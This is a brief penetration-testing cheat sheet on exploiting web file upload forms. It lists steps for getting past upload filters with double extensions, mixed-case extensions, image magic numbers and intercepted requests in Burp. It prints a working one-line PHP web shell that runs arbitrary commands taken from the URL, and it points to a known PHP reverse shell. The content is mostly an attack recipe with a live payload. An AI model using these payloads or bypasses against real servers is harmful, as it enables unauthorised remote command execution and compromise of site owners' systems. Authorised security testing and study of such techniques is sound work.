# File Upload Exploitation

## Steps

1. Try normal webshell upload (`.php`, `.asp`).
2. Test double extensions: `shell.php.jpg`
3. Test case bypass: `shell.pHp`
4. Test magic numbers for image bypass.

## PHP Webshell

<?php system($_GET['cmd']); ?>
Reverse Shell
Use php-reverse-shell.php from Pentestmonkey

Upload, then trigger via browser

Burp Bypass
Intercept request

Change Content-Type and extension in-flight
